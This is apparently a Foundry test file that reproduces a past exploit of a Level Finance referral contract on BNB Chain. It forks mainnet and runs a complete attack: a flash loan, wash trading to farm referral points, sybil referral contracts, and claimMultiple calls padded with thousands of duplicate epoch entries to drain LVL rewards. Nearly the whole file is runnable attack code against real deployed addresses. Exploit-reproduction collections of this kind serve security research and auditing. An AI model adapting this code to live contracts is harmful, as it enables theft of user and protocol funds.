// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/peckshield/status/1653149493133729794
// https://twitter.com/BlockSecTeam/status/1653267431127920641
// @TX
// https://bscscan.com/tx/0x6aef8bb501a53e290837d4398b34d5d4d881267512cfe78eb9ba7e59f41dad04
// https://bscscan.com/tx/0xe1f257041872c075cbe6a1212827bc346df3def6d01a07914e4006ec43027165
// @Summary
// Lack of checking for duplicate elements in arrays

interface IPool {
    function swap(
        address _tokenIn,
        address _tokenOut,
        uint256 _minOut,
        address _to,
        bytes calldata extradata
    ) external;
}

interface ILevelReferralControllerV2 {
    struct UserInfo {
        uint256 tier;
        uint256 tradingPoint;
        uint256 referralPoint;
        uint256 claimed;
    }

    function claim(uint256 _epoch, address _to) external;
    function claimMultiple(uint256[] calldata _epoches, address _to) external;
    function setReferrer(address _referrer) external;
    function currentEpoch() external view returns (uint256);
    function claimable(uint256 _epoch, address _user) external view returns (uint256);
    function setEnableNextEpoch(bool _enable) external;
    function nextEpoch() external;
}

contract ContractTest is Test {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 LVL = IERC20(0xB64E280e9D1B5DbEc4AcceDb2257A87b400DB149);
    ILevelReferralControllerV2 LevelReferralControllerV2 =
        ILevelReferralControllerV2(0x977087422C008233615b572fBC3F209Ed300063a);
    IPool pool = IPool(0xA5aBFB56a78D2BD4689b25B8A77fd49Bb0675874);
    address dodo = 0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d;
    Exploiter exploiter;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 27_830_139);
        cheats.label(address(WBNB), "WBNB");
        cheats.label(address(USDT), "USDT");
        cheats.label(address(LVL), "LVL");
        cheats.label(address(LevelReferralControllerV2), "LevelReferralControllerV2");
        cheats.label(address(pool), "pool");
        cheats.label(address(dodo), "dodo");
    }

    function testExploit() external {
        deal(address(WBNB), address(this), 95 * 1e18);
        exploiter = new Exploiter(address(this));
        LevelReferralControllerV2.setReferrer(address(exploiter));
        createReferral();
        WashTrading();
        vm.warp(block.timestamp + 1 * 60 * 60);
        vm.startPrank(0x6023C6afa26a68E05672F111FdbB1De93cBAc621);
        LevelReferralControllerV2.setEnableNextEpoch(true);
        LevelReferralControllerV2.nextEpoch();
        vm.stopPrank();
        vm.warp(block.timestamp + 60 * 60);
        claim();
        vm.warp(block.timestamp + 5 * 60 * 60);
        for (uint256 i; i < 11; i++) {
            claimReward(2000);
            vm.warp(block.timestamp + i * 15);
        }

        emit log_named_decimal_uint(
            "Attacker LVL Token balance after exploit", LVL.balanceOf(address(this)), LVL.decimals()
        );
    }

    function createReferral() internal {
        for (uint256 i; i < 15; i++) {
            new Referral(address(exploiter));
        }
        for (uint256 i; i < 15; i++) {
            new Referral(address(this));
        }
    }

    function WashTrading() internal {
        DVM(dodo).flashLoan(300 * 1e18, 0, address(this), abi.encode(uint256(20)));
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        uint256 amount = abi.decode(data, (uint256));
        for (uint256 i; i < amount; i++) {
            WBNB.transfer(address(pool), WBNB.balanceOf(address(this)));
            pool.swap(address(WBNB), address(USDT), 1, address(this), abi.encode(address(exploiter)));
            USDT.transfer(address(pool), USDT.balanceOf(address(this)));
            pool.swap(address(USDT), address(WBNB), 1, address(this), abi.encode(address(exploiter)));
        }
        WBNB.transfer(address(exploiter), WBNB.balanceOf(address(this)));
        exploiter.swap(20);
        WBNB.transfer(dodo, 300 * 1e18);
    }

    function claim() internal {
        LevelReferralControllerV2.claimable(13, address(this));
        uint256 tokenID = LevelReferralControllerV2.currentEpoch() - 1;
        LevelReferralControllerV2.claim(tokenID, address(this));
        exploiter.claim(tokenID);
    }

    function claimReward(uint256 amount) internal {
        uint256 tokenID = LevelReferralControllerV2.currentEpoch() - 1;
        uint256[] memory _epoches = new uint256[](amount);
        for (uint256 i; i < amount; i++) {
            _epoches[i] = tokenID;
        }
        LevelReferralControllerV2.claimable(_epoches[0], address(this));
        LevelReferralControllerV2.claimMultiple(_epoches, address(this));
        exploiter.claimMultiple(amount);
    }
}

contract Exploiter {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPool pool = IPool(0xA5aBFB56a78D2BD4689b25B8A77fd49Bb0675874);
    ILevelReferralControllerV2 LevelReferralControllerV2 =
        ILevelReferralControllerV2(0x977087422C008233615b572fBC3F209Ed300063a);

    constructor(address _referrer) {
        LevelReferralControllerV2.setReferrer(_referrer);
    }

    function swap(uint256 amount) external {
        for (uint256 i; i < amount; i++) {
            WBNB.transfer(address(pool), WBNB.balanceOf(address(this)));
            pool.swap(address(WBNB), address(USDT), 1, address(this), abi.encode(address(msg.sender)));
            USDT.transfer(address(pool), USDT.balanceOf(address(this)));
            pool.swap(address(USDT), address(WBNB), 1, address(this), abi.encode(address(msg.sender)));
        }
        WBNB.transfer(msg.sender, WBNB.balanceOf(address(this)));
    }

    function claim(uint256 tokenId) external {
        LevelReferralControllerV2.claim(tokenId, msg.sender);
    }

    function claimMultiple(uint256 amount) external {
        uint256 tokenID = LevelReferralControllerV2.currentEpoch() - 1;
        uint256[] memory _epoches = new uint256[](amount);
        for (uint256 i; i < amount; i++) {
            _epoches[i] = tokenID;
        }
        LevelReferralControllerV2.claimMultiple(_epoches, msg.sender);
    }
}

contract Referral {
    ILevelReferralControllerV2 LevelReferralControllerV2 =
        ILevelReferralControllerV2(0x977087422C008233615b572fBC3F209Ed300063a);

    constructor(address _referrer) {
        LevelReferralControllerV2.setReferrer(_referrer);
    }
}
